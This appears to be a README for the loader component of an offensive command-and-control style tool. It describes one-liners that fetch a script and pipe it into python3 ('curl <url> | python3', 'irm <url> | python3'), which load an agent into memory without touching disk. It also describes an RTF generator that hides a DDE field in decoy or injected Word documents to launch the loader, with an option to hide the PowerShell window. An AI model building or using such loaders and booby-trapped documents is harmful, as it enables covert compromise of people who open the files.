# Loaders

Payload loaders that deliver and execute the [Position-Independent Agent](https://github.com/mrzaxaryan/Position-Independent-Agent) on target machines.

## Python Loader (`PythonLoaderPanel.razor`)

Cross-platform one-liner that downloads and executes the agent shellcode via Python. Generates copy-paste commands for:

- **Windows** — `irm <url> | python3` (PowerShell) or `curl <url> | python3` (cmd)
- **Linux / macOS** — `curl <url> | python3` or `wget -qO- <url> | python3`
- **Android (Termux)** — same curl/wget one-liners

The Python script downloads the platform-appropriate agent binary, maps it into memory, and executes it — no files written to disk.

## RTF Generator (`RtfGeneratorPanel.razor`)

Generates RTF documents that execute the Python loader via DDE (Dynamic Data Exchange) when opened in Microsoft Word. See [RtfGenerator.md](RtfGenerator.md) for technical details.

### Modes

- **Generate** — build an RTF from scratch with a DDE field and decoy content (title + body text)
- **Upload Custom** — upload an existing RTF document and inject the DDE field into it, preserving original formatting

### Options

| Option | Description |
|--------|-------------|
| Loader URL | URL of the Python loader script hosted on GitHub |
| Hidden window | When enabled, PowerShell runs with `-W Hidden` (no visible window) |
